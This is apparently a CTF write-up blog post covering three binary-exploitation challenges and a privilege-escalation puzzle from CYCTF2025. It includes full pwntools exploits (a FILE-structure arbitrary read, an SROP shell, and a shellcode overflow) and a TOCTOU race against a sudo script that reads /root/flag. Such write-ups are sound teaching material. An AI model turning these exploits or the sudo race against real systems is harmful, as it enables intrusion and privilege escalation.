---
layout: post
title: CYCTF2025
tags:
- CTF
- PWN
- MISC
image:
  path: "/assets/img/CYCTF25/thumbnail.png"
description: "All pwn challs + misc/atomic <br /> 3 first bloods \U0001FA78"
categories:
- CTF
- PWN
date: 2025-11-08 16:04 +0000
---
# PWN
## PWN1 ðŸ©¸

File link `https://limewire.com/d/woFr2#nYwU3PlWiF`

We got a binary so we open IDA to reverse it

![Reversed](/assets/img/CYCTF25/pwn1-ida.png){: .normal }
>
We notice a hidden option with number `1337`
it make us able to do FileStructure Overwrite
and after our overwrite it runs fwrite to it
So we have arbitrary read from the memory
{: .prompt-warning}

Exploit file


```python
#!/usr/bin/env python3
from pwn import *

challenge = "app"

exe = context.binary = ELF(args.EXE or f'./{challenge}')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("0.cloud.chals.io", 20465)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
continue
'''

io = start()

fp = FileStructure()
payload = fp.write(exe.sym.flag_buf, 0x50)
io.clean()
io.sendline(b"1337")
io.recvuntil(b"bytes")
io.send(payload)

io.interactive()


```

>
and we PWNED it!!
{: .prompt-danger}

![flag](/assets/img/CYCTF25/pwn1-flag.png){: .normal }

## PWN2

File link `https://limewire.com/d/ayEeG#tvybE1jLkc`

We got a binary so we open IDA to reverse it

Taking a look at check_password function
![Reversed](/assets/img/CYCTF25//pwn2-ida.png){: .normal }

>
we have a buffer overflow, also the buffer is big enough to overwrite RIP stored on the stack, so we have a possibility of <span style="color: red; font-weight:bold;">ROP chain</span>
{: .prompt-warning}

we find all rop chains with `ropper --nocolor --all --file app  > ROP`
then we grep on our needs, we find in this ROP a <span style="color: red; font-weight:bold;">SYSCALL</span>

>
And there is a rule that says: "if you got a syscall + you can control rax value. Then SROP is your primary target"
{: .prompt-tip}


Exploit file


```python
from pwn import *

challenge = "app"

exe = context.binary = ELF(args.EXE or f'./{challenge}')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("0.cloud.chals.io", 23534)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
b* check_password + 90
b* 0x40132f
continue
'''

io = start()

io.clean()
io.sendline(b"/bin/sh\0")
io.clean()
payload1 = flat(
    b"a" * 40, # padding
    p64(exe.sym.check_password+1)
)

padding_length = 0x48
payload1 += b"a" * padding_length
io.send(payload1)
io.recvuntil(b"a" * padding_length)
addr = u64(io.recv(8).strip(b"\n[").ljust(8, b"\x00")) - 0x158 # /bin/sh\0 location
print(hex(addr))

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = addr
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x401339  #syscall address

payload2 = flat(
    b"/bin/sh\0",
    b"a" * 24, # padding
    p64(addr), # new rbp
    p64(0x401337), # pop rax
    p64(15), # rax
    p64(0x401339), #syscall
    frame
)
io.send(payload2)

io.interactive()


```

>
and we PWNED it!!
{: .prompt-danger}

![flag](/assets/img/CYCTF25//pwn2-flag.png){: .normal }

## PWN3 ðŸ©¸

File link `https://limewire.com/d/tE7jL#Hhf3nVkPJo`

Again we got a binary so we open IDA to reverse it

Taking a look at main function
![Reversed](/assets/img/CYCTF25//pwn3-ida.png){: .normal }

>
we have a buffer overflow, also the buffer is big enough to overwrite RIP stored on the stack, so we have a possibility of <span style="color: red; font-weight:bold;">ROP chain</span>
{: .prompt-warning}

>
we also notice that prot variable is set before our stack write, then we can overwrite it to have the value <span style="color: red; font-weight:bold;">PROT_READ | PROT_WRITE | PROT_EXEC</span> which is 7
{: .prompt-warning}

>
Compining those two, we got a free shellcode, which is <span style="color: red; font-weight:bold;"> FULL control flow of the process </span>
{: .prompt-danger}


Exploit file


```python
#!/usr/bin/env python3
from pwn import *

challenge = "app"

exe = context.binary = ELF(args.EXE or f'./{challenge}')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("0.cloud.chals.io", 25661)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b* main + 0xa2
continue
'''

io = start()

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    b"a" * (128 - len(shellcode)), # padding
    b"a" * 8, # dest
    b"a" * 4, # non used
    p32(7), # prot
    p64(0), # rbp
    p64(0x500000)
)

io.sendline(payload)
io.interactive()

```

>
and we PWNED it!!
{: .prompt-danger}

![flag](/assets/img/CYCTF25//pwn3-flag.png){: .normal }

# MISC
## Atomic ðŸ©¸

>
using `sudo -l` we find a script that we can run with `sudo`
{: .prompt-tip}

```bash
#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Usage: $0 <filename>"
    exit 1
fi

input_file="$1"

if [ ! -f "$input_file" ]; then
    echo "Error: File input does not exist"
    exit 1
fi

output_file="/opt/backup_$(date +%s)_$(head -c 6 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 6).tar.gz"

validation_failed=0
while IFS= read -r line || [ -n "$line" ]; do
    path=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    
    [ -z "$path" ] && continue
    
    if [ ! -f "$path" ]; then
        echo "Error: File path does not exist"
        validation_failed=1
        continue
    fi
    
    if [ -L "$path" ]; then
        echo "What are you doing amego?"
        validation_failed=1
        continue
    fi
    
    ext=$(echo "$path" | grep -oE '\.[^.]+$' | tr '[:upper:]' '[:lower:]')
    
    if [ "$ext" != ".cfg" ] ; then
        echo "Error: File does not have .cfg extension"
        validation_failed=1
    fi
done < "$input_file"

if [ $validation_failed -eq 1 ]; then
    echo "Validation failed. Backup aborted."
    exit 1
fi

temp_dir=$(mktemp -d)
trap "rm -rf $temp_dir" EXIT

files_added=0
while IFS= read -r line || [ -n "$line" ]; do
    path=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    
    [ -z "$path" ] && continue
    
    rel_path=$(echo "$path" | sed 's|^/||')
    dir_path=$(dirname "$rel_path")
    [ "$dir_path" != "." ] && mkdir -p "$temp_dir/$dir_path" 2>/dev/null || true
    cp "$path" "$temp_dir/$rel_path" 2>/dev/null && files_added=$((files_added + 1)) || true
done < "$input_file"

if [ $files_added -gt 0 ]; then
    cd "$temp_dir"
    tar -czf "$output_file" . 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Backup created: $output_file ($files_added files)"
    else
        echo "Error: Failed to create backup archive"
        exit 1
    fi
else
    echo "No valid image files found to backup"
fi
```
>
We notice that the file we provide is checked and then reopened and read for use after, which enable us to use  <span style="color: red; font-weight:bold;"> TOCTOU technique </span>
{: .prompt-danger}

>
all these steps ran in our home directory don't forget to do `cd` command
{: .prompt-tip}

we do first
`echo content > content.cfg`

We simply get four instances of the shell we have

1st
`while true; do sudo /usr/local/bin/run.sh file; done`

2nd
`while true; do echo /root/flag > file; done`

3rd
`while true; do echo content.cfg > file; done`

4th
`while true; do for i in $(ls /opt); do out=$(tar -tzf /opt/$i); if [[ $out =~ /root ]]; then echo $i; fi; done; done`

after a sec you will find this output in 4th shell
![output](/assets/img/CYCTF25//atomic-out.png){: .normal }

<span style="color: red; font-weight:bold;"> And we won the race </span><br />
Just pick on of those and `tar xzvf /opt/<file>`, you should get the flag


![output](/assets/img/CYCTF25//atomic-flag.png){: .normal }
